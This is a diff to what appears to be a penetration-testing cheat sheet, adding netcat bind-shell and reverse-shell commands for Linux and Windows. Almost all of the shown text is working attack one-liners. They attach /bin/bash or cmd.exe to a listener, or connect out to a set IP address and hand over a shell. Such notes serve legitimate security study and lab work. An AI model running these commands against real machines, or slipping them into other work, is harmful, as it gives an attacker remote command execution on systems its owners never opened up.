@@ -36,14 +36,20 @@ If there is a firewall running on the target-machine you will not be able to bin
 
 Bind shell
 ```
+#Linux
 nc -vlp 5555 -e /bin/bash
 nc 192.168.1.101 5555
+
+# Windows
+nc.exe -nlvp 4444 -e cmd.exe
 ```
 
 Reverse shell
 ```
 nc 192.168.1.101 5555 -e /bin/bash
 nc -lvp 5555
+
+nc.exe 10.11.0.191 443 -e cmd.exe 
 ```
 
 ```
